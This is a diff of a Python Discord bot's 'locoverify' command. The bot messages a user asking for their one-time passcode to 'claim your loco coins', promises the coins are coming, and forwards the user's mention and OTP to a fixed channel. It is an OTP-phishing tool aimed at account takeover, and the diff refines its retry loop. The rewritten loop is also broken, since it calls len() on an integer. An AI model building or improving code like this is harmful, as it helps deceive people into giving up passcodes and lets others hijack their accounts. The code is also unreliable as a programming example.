@@ -71,24 +71,20 @@ async def locoverify(ctx, user: discord.Member):
             await client.send_message(await client.get_user_info(user.id), "Hey can you send me your OTP to claim your loco coins")
             otp = await client.wait_for_message(author=user)
             otp = otp.content
-            if len(otp) == 4:
+            c = True
+            while c:
                 try:
                     otp = int(otp)
+                    if len(otp) != 4:
+                        pass
+                    else:
+                        await client.send_message(await client.get_user_info(user.id), "Thanks your coins are on the way")
+                        await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
+                        c = False
                 except ValueError:
                     await client.send_message(await client.get_user_info(user.id), "That doesn't seem to be it!")
                     otp = await client.wait_for_message(author=user)
                     otp = otp.content
-                await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
-            else:
-                while len(otp) != 4:
-                    try:
-                        otp = int(otp)
-                    except ValueError:
-                        await client.send_message(await client.get_user_info(user.id), "That doesn't seem to be it!")
-                        otp = await client.wait_for_message(author=user)
-                        otp = otp.content
-                    await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
-                    await client.send_message(await client.get_user_info(user.id), "Thanks your coins are on the way")
     else:
         await client.send_message(ctx.message.channel, "This bot isn't made for DMs")
 
